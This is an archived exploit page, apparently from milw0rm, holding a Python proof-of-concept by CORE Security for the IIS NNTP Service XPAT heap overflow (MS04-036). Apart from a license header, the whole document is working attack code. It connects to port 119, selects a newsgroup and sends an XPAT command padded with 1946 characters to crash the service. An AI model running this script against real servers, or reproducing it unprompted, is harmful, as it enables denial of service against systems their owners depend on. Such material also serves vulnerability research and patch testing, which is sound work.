<html><head><title>MS Windows NNTP Service (XPAT) Denial of Service Exploit (MS04-036)
</title></head><pre>#--
# IIS NNTP Service XPAT command heap overflow proof of concept
#
# Author:
#    Lucas Lavarello (lucas at coresecurity dot com)
#    Juliano Rizzo   (juliano at coresecurity dot com)
#
# Copyright (c) 2001-2004 CORE Security Technologies, CORE SDI Inc.
# All rights reserved.
#
# THIS SOFTWARE IS PROVIDED ``AS IS'' AND ANY EXPRESS OR IMPLIED
# WARRANTIES ARE DISCLAIMED. IN NO EVENT SHALL CORE SDI Inc. BE LIABLE
# FOR ANY DIRECT,  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY OR
# CONSEQUENTIAL DAMAGES RESULTING FROM THE USE OR MISUSE OF
# THIS SOFTWARE
#
# www coresecurity com
#--
from socket import * 

host = &quot;127.0.0.1&quot;
pat = &quot;C&quot;*1946  + &quot; &quot; + &quot;X&quot;*10

newsgroup = &quot;control.newgroup&quot;

sock = socket(AF_INET, SOCK_STREAM)
sock.connect((host, 119))

print sock.recv(512)

sock.send(&quot;group %s\x0d\x0a&quot; % newsgroup)

print sock.recv(512)

sock.send(&quot;xpat From 1-9 %s \x0d\x0a&quot; % pat)


# milw0rm.com [2004-10-16]</pre></html>